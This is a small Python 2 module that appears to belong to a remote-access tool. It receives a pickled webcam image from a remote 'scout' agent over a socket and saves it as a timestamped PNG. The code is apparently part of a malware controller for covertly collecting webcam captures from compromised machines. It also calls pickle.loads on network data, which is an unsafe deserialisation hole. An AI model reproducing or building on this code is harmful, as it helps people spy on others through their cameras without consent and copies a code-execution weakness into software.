import cv2
import os
import pickle
import library.modules.recv_all as recv_all
from datetime import datetime


def main(sock):
    print '[*]Waiting for raw webcam pickle to arrive'
    raw_bytes = recv_all.main(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if raw_bytes.startswith('[!]Error in scout : '):
        print raw_bytes
    else:
        img = pickle.loads(raw_bytes)
        img.save(file_name, 'PNG')
        print '[+]Wrote file to : ' + os.path.join(os.getcwd(), file_name)
        print '[+]Done'
